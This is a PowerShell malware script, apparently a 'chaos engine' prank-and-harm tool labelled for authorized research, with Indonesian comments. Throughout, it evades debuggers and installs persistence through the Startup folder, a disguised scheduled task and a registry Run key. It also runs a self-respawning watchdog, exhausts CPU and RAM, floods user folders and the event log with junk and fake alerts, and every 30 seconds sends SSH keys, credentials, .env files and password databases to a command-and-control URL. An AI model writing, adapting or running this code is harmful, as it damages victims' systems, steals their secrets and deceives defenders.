# ================================================================
# jomok.ps1 - V17.2 GOD MODE | sudo3rs | AUTHORIZED RESEARCH ONLY
# Windows PowerShell - Full Feature Parity with jomok.sh
# ================================================================

# ============ KONFIGURASI ============
$ErrorActionPreference = "SilentlyContinue"
$IMG_NAME = "ambatukam.jpg"
$IMG_URL1 = "https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t500x500.jpg"
$IMG_URL2 = "https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t240x240.jpg"
$YT_URL = "https://www.youtube.com/watch?v=zk-53fgtuyo"
$C2_SIM = "http://192.0.2.1:8443/exfil"
$TEMP_IMG = "$env:TEMP\$IMG_NAME"
$YT_AUDIO = "$env:TEMP\.jmk_yt.mp3"
$UP = $env:USERPROFILE
$SP = $MyInvocation.MyCommand.Path
$IMG_B64 = "LzlqLzRBQVFTa1pKUmdBQkFRQUFBUUFCQUFELzJ3QkRBQWdHQmdjR0JRZ0hCd2NKQ1FnS0RCUU5EQXNMREJrU0V3OFVIUm9mSGgwYUhCd2dKQzRuSUNJc0l4d2NLRGNwTERBeE5EUTBIeWM1UFRneVBDNHpOREwvMndCREFRa0pDUXdMREJnTkRSZ3lJUndoTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qTC93QUFSQ0FCNEFIZ0RBU0lBQWhFQkF4RUIvOFFBSHdBQUFRVUJBUUVCQVFFQUFBQUFBQUFBQUFFQ0F3UUZCZ2NJQ1FvTC84UUF0UkFBQWdFREF3SUVBd1VGQkFRQUFBRjlBUUlEQUFRUkJSSWhNVUVHRTFGaEJ5SnhGREtCa2FFSUkwS3h3UlZTMGZBa00ySnlnZ2tLRmhjWUdSb2xKaWNvS1NvME5UWTNPRGs2UTBSRlJrZElTVXBUVkZWV1YxaFpXbU5rWldabmFHbHFjM1IxZG5kNGVYcURoSVdHaDRpSmlwS1RsSldXbDVpWm1xanBLV21wNmlwcXJLenRMVzJ0N2k1dXNMRHhNWEd4OGpKeXRMVDFOWFcxOWpaMnVIaTQrVGw1dWZvNmVyeDh2UDA5ZmIzK1BuNi84UUFId0VBQXdFQkFRRUJBUUVCQVFBQUFBQUFBQUVDQXdRRkJnY0lDUW9MLzhRQXRSRUFBZ0VDQkFRREJBY0ZCQVFBQVFKM0FBRUNBeEVFQlNFeEJoSkJVUWRoY1JNaU1vRUlGRUtSb2JIQkNTTXpVdkFWWW5MUkNoWWtOT0VsOFJjWUdSb21KeWdwS2pVMk56ZzVPa05FUlVaSFNFbEtVMVJWVmxkWVdWcGpaR1ZtWm5hR2xxYzNSMWRuZDRlWHFHaGNYbDVoY0cxaWNYbDV4ZWhweGVudzZwcWM2dXJxNnp0TFcydDdpNXVzTER4TVhHeDhqSnl0TFQxTlhXMTlqWjJ1SGk0K1RsNXVmbzZlcng4dlAwOWZiMytQbjYvOW9BREFNQkFBSVJBeEVBUHdEOC9xS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlpZ0Fvb29vQUtLS0tBQ2lpaWdBb29vb0FLS0tLQUNpaWlnQW9vb29BS0tLS0FDaWlnRC8yUT09"

# ============ 1. ANTI-DEBUGGING ============
$dbgList = @("ollydbg","x64dbg","x32dbg","ida","ida64","windbg","dnspy",
             "procmon","procmon64","procexp","procexp64","wireshark","fiddler",
             "httpdebugger","cheatengine")
foreach ($d in $dbgList) {
    if (Get-Process -Name $d -ErrorAction SilentlyContinue) { exit 0 }
}
if ([System.Diagnostics.Debugger]::IsAttached) { exit 0 }

# ============ 2. SINGLE INSTANCE ============
$mtx = New-Object System.Threading.Mutex($false, "Global\JomokMtx_V17")
if (-not $mtx.WaitOne(0)) { exit 0 }

# ============ 3. SELF-HEALING IMAGE (3-layer) ============
function Heal-Image {
    if ((Test-Path $TEMP_IMG) -and (Get-Item $TEMP_IMG).Length -gt 0) { return }
    Remove-Item $TEMP_IMG -Force -ErrorAction SilentlyContinue
    try { Invoke-WebRequest -Uri $IMG_URL1 -OutFile $TEMP_IMG -TimeoutSec 15 -UseBasicParsing; if ((Test-Path $TEMP_IMG) -and (Get-Item $TEMP_IMG).Length -gt 0) { return } } catch {}
    try { Invoke-WebRequest -Uri $IMG_URL2 -OutFile $TEMP_IMG -TimeoutSec 15 -UseBasicParsing; if ((Test-Path $TEMP_IMG) -and (Get-Item $TEMP_IMG).Length -gt 0) { return } } catch {}
    try { [System.IO.File]::WriteAllBytes($TEMP_IMG, [System.Convert]::FromBase64String($IMG_B64)) } catch {}
}

# ============ 4. WALLPAPER LOCK ============
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WallpaperLock {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@ -ErrorAction SilentlyContinue

function Set-WallpaperLock {
    if (!(Test-Path $TEMP_IMG)) { return }
    [WallpaperLock]::SystemParametersInfo(0x0014, 0, $TEMP_IMG, 0x01 -bor 0x02) | Out-Null
}

# ============ 5. UNLIMITED IMAGE FLOOD ============
function Spread-Unlimited {
    if (!(Test-Path $TEMP_IMG)) { return }
    $targets = @("$UP\Desktop","$UP\Documents","$UP\Downloads","$UP\Pictures","$UP\Music","$UP\Videos","$UP")
    foreach ($t in $targets) {
        if (Test-Path $t) {
            Get-ChildItem $t -Recurse -Directory -Depth 5 -ErrorAction SilentlyContinue | ForEach-Object {
                $rn = ".ov_" + (Get-Random) + (Get-Random) + ".jpg"
                Copy-Item $TEMP_IMG "$($_.FullName)\$rn" -Force -ErrorAction SilentlyContinue
            }
            # juga copy langsung ke root folder target
            $rn = ".ov_" + (Get-Random) + (Get-Random) + ".jpg"
            Copy-Item $TEMP_IMG "$t\$rn" -Force -ErrorAction SilentlyContinue
        }
    }
}

# ============ 6. GUI POP-UP ============
function Show-Popup {
    if (!(Test-Path $TEMP_IMG)) { return }
    Start-Process $TEMP_IMG -ErrorAction SilentlyContinue
}

# ============ 7. YOUTUBE AUDIO + FALLBACK ============
function Get-YouTubeAudio {
    if ((Test-Path $YT_AUDIO) -and (Get-Item $YT_AUDIO).Length -gt 0) { return $true }
    # Try yt-dlp
    $ytdlp = Get-Command yt-dlp -ErrorAction SilentlyContinue
    if ($ytdlp) {
        & yt-dlp -x --audio-format mp3 --audio-quality 5 --no-warnings -o $YT_AUDIO $YT_URL 2>$null
        if ((Test-Path $YT_AUDIO) -and (Get-Item $YT_AUDIO).Length -gt 0) { return $true }
    }
    # Try youtube-dl
    $ytdl = Get-Command youtube-dl -ErrorAction SilentlyContinue
    if ($ytdl) {
        & youtube-dl -x --audio-format mp3 -o $YT_AUDIO $YT_URL 2>$null
        if ((Test-Path $YT_AUDIO) -and (Get-Item $YT_AUDIO).Length -gt 0) { return $true }
    }
    # Try python yt-dlp module
    try {
        & python -m pip install -q yt-dlp 2>$null
        & python -m yt_dlp -x --audio-format mp3 --audio-quality 5 -o $YT_AUDIO $YT_URL 2>$null
        if ((Test-Path $YT_AUDIO) -and (Get-Item $YT_AUDIO).Length -gt 0) { return $true }
    } catch {}
    # Check for any format downloaded
    $found = Get-ChildItem "$env:TEMP\.jmk_yt*" -Exclude "*.downloading" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found -and $found.Length -gt 0) { $script:YT_AUDIO = $found.FullName; return $true }
    return $false
}

$script:WMPPlayer = $null
function Start-YouTubeAudio {
    # Cek apakah sudah playing
    if ($script:WMPPlayer -ne $null) {
        try { if ($script:WMPPlayer.playState -eq 3) { return } } catch {}
    }
    # Download YouTube jika belum ada
    if (-not (Test-Path $YT_AUDIO) -or (Get-Item $YT_AUDIO -ErrorAction SilentlyContinue).Length -eq 0) {
        if (-not (Test-Path "$env:TEMP\.jmk_yt.downloading")) {
            "" | Set-Content "$env:TEMP\.jmk_yt.downloading"
            Start-Job -ScriptBlock {
                param($url,$out)
                $ytdlp = Get-Command yt-dlp -ErrorAction SilentlyContinue
                if ($ytdlp) { & yt-dlp -x --audio-format mp3 --audio-quality 5 -o $out $url 2>$null }
                else {
                    try { & python -m pip install -q yt-dlp 2>$null; & python -m yt_dlp -x --audio-format mp3 -o $out $url 2>$null } catch {}
                }
                Remove-Item "$env:TEMP\.jmk_yt.downloading" -Force -ErrorAction SilentlyContinue
            } -ArgumentList $YT_URL,$YT_AUDIO | Out-Null
        }
    }
    # Play jika file ada
    $audioFile = $null
    if ((Test-Path $YT_AUDIO) -and (Get-Item $YT_AUDIO).Length -gt 0) {
        $audioFile = $YT_AUDIO
    } else {
        $found = Get-ChildItem "$env:TEMP\.jmk_yt*" -Exclude "*.downloading" -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 } | Select-Object -First 1
        if ($found) { $audioFile = $found.FullName }
    }
    if ($audioFile) {
        try {
            $script:WMPPlayer = New-Object -ComObject WMPlayer.OCX
            $script:WMPPlayer.URL = $audioFile
            $script:WMPPlayer.settings.setMode("loop", $true)
            $script:WMPPlayer.settings.volume = 80
            $script:WMPPlayer.controls.play()
            return
        } catch {}
        # Fallback: mpg123
        $mpg = Get-Command mpg123 -ErrorAction SilentlyContinue
        if ($mpg) { Start-Process mpg123 -ArgumentList "-q --loop -1 `"$audioFile`"" -WindowStyle Hidden; return }
        # Fallback: ffplay
        $ff = Get-Command ffplay -ErrorAction SilentlyContinue
        if ($ff) { Start-Process ffplay -ArgumentList "-nodisp -autoexit -loop 0 `"$audioFile`"" -WindowStyle Hidden; return }
    }
    # Fallback: beep tones
    Start-Job -ScriptBlock {
        while ($true) {
            [Console]::Beep(440, 500); [Console]::Beep(880, 500)
            [Console]::Beep(660, 500); [Console]::Beep(440, 500)
        }
    } | Out-Null
}

# ============ 8. TRIPLE PERSISTENCE ============
function Install-Persistence {
    if (-not $SP) { return }
    # 8a. Startup Folder
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $stTarget = "$startup\win_sys_service.ps1"
    if (-not (Test-Path $stTarget)) {
        Copy-Item $SP $stTarget -Force -ErrorAction SilentlyContinue
    }
    # 8b. Scheduled Task (setiap 1 menit)
    try {
        $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SP`""
        $trg = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 365)
        $set = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "WindowsCriticalSystemUpdate" -Action $act -Trigger $trg -Settings $set -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    # 8c. Registry Run Key
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regVal = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SP`""
        Set-ItemProperty -Path $regPath -Name "SystemRuntimeService" -Value $regVal -ErrorAction SilentlyContinue
    } catch {}
}

# ============ 9. ANTI-KILL WATCHDOG ============
function Start-Watchdog {
    if (-not $SP) { return }
    Start-Job -ScriptBlock {
        param($path)
        while ($true) {
            $running = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {
                try { $_.CommandLine -like "*jomok*" -or $_.CommandLine -like "*win_sys_service*" } catch { $false }
            }
            if ($running.Count -lt 2) {
                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
            }
            Start-Sleep 1
        }
    } -ArgumentList $SP | Out-Null
}

# ============ 10. CPU CORE SATURATION ============
function Start-CPUBurn {
    $cores = [Environment]::ProcessorCount
    for ($i = 0; $i -lt $cores; $i++) {
        Start-Job -ScriptBlock { while ($true) { [Math]::Sqrt(Get-Random) | Out-Null } } | Out-Null
    }
}

# ============ 11. RAM EXHAUSTION ============
function Start-RAMBomb {
    Start-Job -ScriptBlock {
        $chunks = [System.Collections.ArrayList]::new()
        while ($true) {
            try {
                $buf = [byte[]]::new(256MB)
                (New-Object Random).NextBytes($buf)
                $chunks.Add($buf) | Out-Null
            } catch { Start-Sleep 5 }
            Start-Sleep 2
        }
    } | Out-Null
}

# ============ 12. DISCOVERY & EXFILTRATION (periodic 30s) ============
function Start-Exfil {
    Start-Job -ScriptBlock {
        param($c2, $up)
        while ($true) {
            $patterns = @("id_rsa","id_rsa.pub","id_ed25519","*.pem","*.key","*.crt",
                         ".env","*.env","credentials","credentials.json",
                         "*.kdbx","*.db","*.sqlite","known_hosts","authorized_keys")
            foreach ($p in $patterns) {
                Get-ChildItem $up -Recurse -Filter $p -Depth 4 -Force -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        $body = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                        $headers = @{
                            "X-Exfil-File" = $_.FullName
                            "X-Exfil-Host" = $env:COMPUTERNAME
                            "X-Exfil-User" = $env:USERNAME
                        }
                        Invoke-WebRequest -Uri $c2 -Method POST -Body $body -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
                    } catch {}
                }
            }
            Start-Sleep 30
        }
    } -ArgumentList $C2_SIM,$UP | Out-Null
}

# ============ 13. EVENT LOG FLOOD (SIEM equivalent) ============
function Start-EventLogFlood {
    Start-Job -ScriptBlock {
        while ($true) {
            $ts = Get-Date -Format o
            $hn = $env:COMPUTERNAME
            $msgs = @(
                "CRITICAL: Unauthorized lateral movement detected - host=$hn ts=$ts",
                "CRITICAL: Brute force RDP detected from 10.0.0.$(Get-Random -Min 1 -Max 255) - host=$hn ts=$ts",
                "CRITICAL: Suspicious process spawned by $env:USERNAME - host=$hn pid=$PID ts=$ts",
                "WARNING: Possible rootkit detected: hidden service on host=$hn ts=$ts"
            )
            foreach ($m in $msgs) {
                try { Write-EventLog -LogName Application -Source "Application" -EventId (Get-Random -Min 1000 -Max 9999) -EntryType Error -Message $m -ErrorAction SilentlyContinue } catch {}
            }
            Start-Sleep (Get-Random -Min 5 -Max 15)
        }
    } | Out-Null
}

# ============================================================
#                    MAIN EXECUTION
# ============================================================
Write-Host "[*] Chaos Engine V17.2 - GOD MODE (Windows)" -ForegroundColor Red

# Fase 1: Setup
Heal-Image
Install-Persistence
Start-Watchdog

# Fase 2: Launch semua modul
Start-CPUBurn
Start-RAMBomb
Start-Exfil
Start-EventLogFlood
Start-YouTubeAudio

# Fase 3: Main Loop (setiap 10 detik)
while ($true) {
    Heal-Image
    Set-WallpaperLock
    Spread-Unlimited
    if ((Get-Random -Maximum 3) -eq 0) { Show-Popup }
    Start-YouTubeAudio
    Start-Sleep 10
}
